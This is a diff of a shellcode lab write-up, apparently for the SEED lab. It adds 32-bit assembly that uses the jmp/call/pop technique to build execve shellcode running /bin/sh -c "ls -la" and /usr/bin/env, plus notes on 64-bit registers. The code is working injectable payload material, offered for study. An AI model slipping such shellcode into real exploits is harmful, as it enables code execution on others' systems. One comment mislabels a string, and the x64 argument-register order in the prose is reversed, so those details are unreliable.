@@ -100,7 +100,7 @@ This means EAX would store the execve function itself (execve has a system call 
 
 <details>
 <summary>Seed lab code</summary>
-<pre>
+<pre><code>
 section .text
   global _start
     _start:
@@ -120,12 +120,12 @@ section .text
       xor eax, eax ; eax = 0x00000000
       mov al, 0x0b ; eax = 0x0000000b
       int 0x80
-</pre>
+</code></pre>
 </details>
 
 <details>
 <summary>My solution to <code>/bin/sh -c "ls -la"</code></summary>
-<pre>
+<pre><code>
 section .text
   global _start
     _start:
@@ -167,12 +167,12 @@ section .text
       xor  eax, eax     ; eax = 0x00000000
       mov   al, 0x0b    ; eax = 0x0000000b
       int 0x80
-</pre>
+</code></pre>
 </details>
 
 <details>
 <summary>My solution to <code>/usr/bin/env</code> (supplying environment variables)</summary>
-<pre>
+<pre><code>
 section .text
   global _start
     _start:    
@@ -222,12 +222,109 @@ section .text
       xor  eax, eax     ; eax = 0x00000000
       mov   al, 0x0b    ; eax = 0x0000000b
       int 0x80
-</pre>
+</code></pre>
 </details>
 
 #### Using Code Segment
 
 Rather than dynamically constructing all the necessary data structures on the stack, so their addresses can be obtained from the stack pointer `esp`, data can be stored in the code region, and its address is obtained via the function call mechanism.
+
+<details>
+<summary>My solution to <code>/bin/sh -c "ls -la"</code> using code segment</summary>
+<pre><code>
+section .text
+  global _start
+    _start:
+        BITS 32
+	    jmp short two
+    one:
+ 	    pop esi
+     	xor eax, eax
+ 	
+ 	    mov [esi+7],  al   ; /bin/sh%0
+ 	    mov [esi+10], al   ; -c%0
+ 	    mov [esi+17], al   ; ls -la%0
+ 	
+ 	    mov [esi+18], esi  ; put address of "/usr/bin/env" in AAAA
+ 	
+ 	    lea ebx, [esi+8]   ; get address of "-c"
+ 	    mov [esi+22], ebx  ; put address of "-c" in BBBB
+ 	
+ 	    lea ebx, [esi+11]  ; get address of "ls -la"
+ 	    mov [esi+26], ebx  ; put address of "ls -la" in CCCC
+ 	    
+ 	    mov [esi+30], eax  ; put NULL in DDDD
+ 	
+ 	    mov al,  0x0b      ; pass the execve syscall number as argument
+ 	    mov ebx, esi
+ 	    lea ecx, [esi+18]  ; /bin/sh -c "ls -la"
+ 	    lea edx, [esi+30]  ; NULL
+
+ 	    int 0x80           ; execve
+    two:
+ 	    call one
+ 	    db '/bin/sh*-c*ls -la*AAAABBBBCCCCDDDD'
+ 	       ;01234567890123456789012345678901234
+ 	       ;          1         2         3
+</code></pre>
+</details>
+
+<details>
+<summary>My solution to <code>/usr/bin/env</code> (supplying environment variables) using code segment</summary>
+<pre><code>
+section .text
+  global _start
+    _start:
+        BITS 32
+	    jmp short two
+    one:
+ 	    pop esi
+     	xor eax, eax
+ 	
+ 	    mov [esi+12], al   ; /usr/bin/env%0
+ 	    mov [esi+17], al   ; a=11%0
+ 	    mov [esi+23], al   ; bb=22%0
+ 	    mov [esi+32], al   ; ccc=4567%0
+ 	
+ 	    mov [esi+33], esi  ; address of /usr/bin/env in AAAA
+ 	    mov [esi+37], eax  ; put NULL in BBBB (to indicate end of array)
+ 	
+ 	    lea ebx, [esi+13]  ; get address of a=11
+ 	    mov [esi+41], ebx  ; address of a=11 in CCCC
+ 	
+ 	    lea ebx, [esi+18]  ; get address of bb=22
+ 	    mov [esi+45], ebx  ; address of bb=22 in DDDD
+ 	    
+ 	    lea ebx, [esi+24]  ; get address of ccc=4567
+ 	    mov [esi+49], ebx  ; address of ccc=4567 in EEEE
+ 	
+ 	    mov al,  0x0b      ; pass the execve syscall number as argument
+ 	    mov ebx, esi
+ 	    lea ecx, [esi+33]  ; /usr/bin/env
+ 	    lea edx, [esi+41]  ; a=11,bb=22,ccc=4567
+
+ 	    int 0x80           ; execve
+    two:
+ 	    call one
+ 	    db '/usr/bin/env*a=11*bb=22*ccc=4567*AAAABBBBCCCCDDDDEEEE'
+ 	    ;   01234567890123456789012345678901234567890123456789012
+ 	    ;             1         2         3         4         5 
+</code></pre>
+</details>
+
+Writing 64-bit shellcode is not too different to writing 32-bit shellcode. The differences are mainly in the registers. For the x64 architecture, invoking system call
+is done through the syscall instruction, and the first three arguments for the system call are stored in the rdx, rsi, rdi registers, respectively.
+<details>
+<summary>64-bit equivalent registers</summary>
+<ul>
+<li>eax = rax</li>
+<li>ebx = rdi</li>
+<li>ecx = rsi</li>
+<li>edx = rdx</li>
+</ul>
+</details>
+
+
 
 
 
